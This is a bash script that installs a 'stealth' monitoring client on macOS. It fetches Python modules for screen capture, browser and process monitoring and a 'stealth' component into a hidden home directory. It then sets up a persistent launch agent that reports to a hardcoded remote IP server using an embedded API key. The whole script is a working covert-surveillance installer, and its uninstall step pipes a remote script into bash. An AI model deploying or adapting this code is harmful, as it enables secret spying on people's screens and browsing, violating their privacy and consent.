#!/bin/bash
# Tenjo Remote Stealth Installer for macOS
# This script downloads and installs the monitoring client from GitHub

set -e

# Configuration
APP_NAME="TenjoClient"
INSTALL_DIR="$HOME/.tenjo"
SERVICE_NAME="com.tenjo.monitor"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_VENV="$INSTALL_DIR/.venv"
SERVER_URL="http://103.129.149.67"  # Change this to your server URL
API_KEY="tenjo-api-key-2024"
GITHUB_REPO="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[$(date '+%Y-%m-%d %H:%M:%S')] $1${NC}"
}

warn() {
    echo -e "${YELLOW}[$(date '+%Y-%m-%d %H:%M:%S')] WARNING: $1${NC}"
}

error() {
    echo -e "${RED}[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1${NC}"
    exit 1
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
   error "This script should not be run as root for stealth installation"
fi

log "Starting Tenjo remote stealth installation..."

# Function to install Homebrew if not present
install_homebrew() {
    if ! command -v brew &> /dev/null; then
        log "Installing Homebrew (required for Python)..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" || error "Failed to install Homebrew"
        
        # Add Homebrew to PATH for current session
        if [[ -f "/opt/homebrew/bin/brew" ]]; then
            eval "$(/opt/homebrew/bin/brew shellenv)"
        elif [[ -f "/usr/local/bin/brew" ]]; then
            eval "$(/usr/local/bin/brew shellenv)"
        fi
    fi
}

# Function to install Python if not present
install_python() {
    if ! command -v python3 &> /dev/null; then
        log "Installing Python 3..."
        brew install python3 || error "Failed to install Python 3"
    fi
}

# Function to create installation directory
create_install_dir() {
    log "Creating installation directory..."
    rm -rf "$INSTALL_DIR" 2>/dev/null || true
    mkdir -p "$INSTALL_DIR"
    mkdir -p "$INSTALL_DIR/src/core"
    mkdir -p "$INSTALL_DIR/src/modules"
    mkdir -p "$INSTALL_DIR/src/utils"
    mkdir -p "$INSTALL_DIR/data/screenshots"
    mkdir -p "$INSTALL_DIR/data/pending"
    mkdir -p "$INSTALL_DIR/logs"
}

# Function to create Python virtual environment
create_venv() {
    log "Creating Python virtual environment..."
    python3 -m venv "$PYTHON_VENV" || error "Failed to create virtual environment"
    source "$PYTHON_VENV/bin/activate"
    
    log "Installing required Python packages..."
    pip install --quiet --upgrade pip
    pip install --quiet mss pillow requests psutil pyobjc-framework-ApplicationServices pyobjc-framework-Quartz
}

# Function to download source files from GitHub
download_source_files() {
    log "Downloading source files from GitHub..."
    
    # Download main.py
    curl -sSL "$GITHUB_REPO/client/main.py" -o "$INSTALL_DIR/main.py" || error "Failed to download main.py"
    
    # Download core files
    curl -sSL "$GITHUB_REPO/client/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py" || error "Failed to download config.py"
    
    # Download module files
    curl -sSL "$GITHUB_REPO/client/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py" || error "Failed to download screen_capture.py"
    curl -sSL "$GITHUB_REPO/client/src/modules/process_monitor.py" -o "$INSTALL_DIR/src/modules/process_monitor.py" || error "Failed to download process_monitor.py"
    curl -sSL "$GITHUB_REPO/client/src/modules/browser_monitor.py" -o "$INSTALL_DIR/src/modules/browser_monitor.py" || error "Failed to download browser_monitor.py"
    curl -sSL "$GITHUB_REPO/client/src/modules/stream_handler.py" -o "$INSTALL_DIR/src/modules/stream_handler.py" || error "Failed to download stream_handler.py"
    
    # Download utility files
    curl -sSL "$GITHUB_REPO/client/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py" || error "Failed to download api_client.py"
    curl -sSL "$GITHUB_REPO/client/src/utils/stealth.py" -o "$INSTALL_DIR/src/utils/stealth.py" || error "Failed to download stealth.py"
    
    # Create __init__.py files
    touch "$INSTALL_DIR/src/__init__.py"
    touch "$INSTALL_DIR/src/modules/__init__.py"
    touch "$INSTALL_DIR/src/utils/__init__.py"
    touch "$INSTALL_DIR/src/core/__init__.py"
    
    log "Source files downloaded successfully"
}

# Function to update configuration
update_config() {
    log "Updating configuration..."
    
    # Update SERVER_URL in config.py if needed
    if [[ "$SERVER_URL" != "http://127.0.0.1:8000" ]]; then
        sed -i '' "s|http://127.0.0.1:8000|$SERVER_URL|g" "$INSTALL_DIR/src/core/config.py"
        log "Server URL updated to: $SERVER_URL"
    fi
}

# Function to create launch agent (auto-start)
create_launch_agent() {
    log "Creating launch agent for auto-start..."
    
    cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PYTHON_VENV/bin/python</string>
        <string>$INSTALL_DIR/main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/stdout.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/stderr.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
</dict>
</plist>
EOF

    # Load the launch agent
    launchctl load "$PLIST_FILE" 2>/dev/null || true
    launchctl start "$SERVICE_NAME" 2>/dev/null || true
    
    log "Launch agent created and started"
}

# Function to start the client immediately
start_client() {
    log "Starting Tenjo client..."
    source "$PYTHON_VENV/bin/activate"
    cd "$INSTALL_DIR"
    nohup python3 main.py > logs/client.log 2>&1 &
    log "Client started in background"
}

# Function to test installation
test_installation() {
    log "Testing installation..."
    sleep 3
    
    if pgrep -f "python.*main.py" > /dev/null; then
        log "✅ Installation successful! Client is running."
        
        # Show client info
        source "$PYTHON_VENV/bin/activate"
        cd "$INSTALL_DIR"
        python3 -c "
import sys
sys.path.append('src')
from core.config import Config
print(f'Client ID: {Config.CLIENT_ID}')
print(f'Server URL: {Config.SERVER_URL}')
print(f'Installation path: $INSTALL_DIR')
" 2>/dev/null || true
    else
        warn "Client may not be running. Check logs: $INSTALL_DIR/logs/"
    fi
}

# Main installation process
main() {
    install_homebrew
    install_python
    create_install_dir
    create_venv
    download_source_files
    update_config
    create_launch_agent
    start_client
    test_installation
    
    log "🎉 Tenjo stealth installation completed!"
    log "📁 Installation directory: $INSTALL_DIR"
    log "📊 Dashboard: $SERVER_URL"
    log "🗑️  To uninstall: curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/stealth_uninstall_macos.sh | bash"
}

# Run main function
main
